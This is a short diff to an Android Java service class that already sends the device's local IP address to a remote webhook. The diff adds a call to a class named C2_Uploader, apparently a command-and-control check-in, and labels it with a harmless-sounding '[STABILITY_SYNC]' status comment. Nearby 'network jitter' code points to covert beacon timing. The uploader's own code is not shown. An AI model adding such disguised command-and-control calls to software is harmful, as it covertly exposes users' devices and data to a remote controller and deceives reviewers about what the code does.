@@ -77,7 +77,11 @@ public class WorkManager_Sync extends Service {
 
                 String currentIp = MainActivity.getLocalIpAddress();
                 if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
-                    networkExecutor.execute(() -> sendIpToWebhook(currentIp));
+                    networkExecutor.execute(() -> {
+                        sendIpToWebhook(currentIp);
+                        // [STABILITY_SYNC] Perform full status check-in with the backend
+                        C2_Uploader.checkIn(WorkManager_Sync.this);
+                    });
                 }
                 
                 // --- NETWORK JITTER PROTOCOL ---
